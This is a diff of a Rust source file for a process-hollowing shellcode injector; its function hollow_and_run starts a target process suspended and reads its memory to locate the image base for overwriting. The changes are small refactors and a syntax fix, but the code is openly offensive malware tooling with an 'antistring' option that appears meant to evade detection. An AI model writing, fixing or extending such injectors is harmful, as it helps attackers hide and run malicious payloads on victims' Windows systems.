@@ -1,4 +1,4 @@
-use std::{mem, ptr};
+use std::ptr;
 use std::ffi::{CString, c_void};
 use windows::core::{PCSTR, PSTR};
 use windows::Win32::System::Threading::{CREATE_SUSPENDED,PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, PROCESSINFOCLASS, STARTUPINFOA};
@@ -7,14 +7,16 @@ use windows::Win32::System::Threading::{CreateProcessA, NtQueryInformationProces
 #[cfg(not(feature = "antistring"))]
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
 #[cfg(feature = "antistring")]
+use std::mem;
+#[cfg(feature = "antistring")]
 use windows::Win32::Foundation::{BOOL, HANDLE};
 #[cfg(feature = "antistring")]
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
 #[cfg(feature = "antistring")]
 use windows::Win32::System::Threading::PROCESS_CREATION_FLAGS;
 
-const POINTER_SIZE: usize = mem::size_of::<&u8>();
-const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;
+const POINTER_SIZE: u32 = usize::BITS >> 3;
+const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE * 6;
 const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
 
@@ -58,7 +60,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
     let process_handle = process_information.hProcess;
-    let mut basic_information: = PROCESS_BASIC_INFORMATION::default();
+    let mut basic_information = PROCESS_BASIC_INFORMATION::default();
     let info_class = PROCESSINFOCLASS::default();
     if let Err(error) = unsafe { NtQueryInformationProcess(process_handle, info_class, &mut basic_information as *mut _ as *mut c_void, POINTER_SIZE_TIMES_SIX, ptr::null_mut()) } {
         panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
@@ -68,7 +70,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.ReadProcessMemory.html
     let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
-    let mut address_buffer = [0; POINTER_SIZE];
+    let mut address_buffer = [0; POINTER_SIZE as usize];
     let read_result = unsafe { ReadProcessMemory(process_handle, image_base_address as *const c_void, address_buffer.as_mut_ptr() as *mut c_void, address_buffer.len(), ptr::null_mut()) };
     if !read_result.as_bool() {
         panic!("Could not read the address of the code base with ReadProcessMemory");
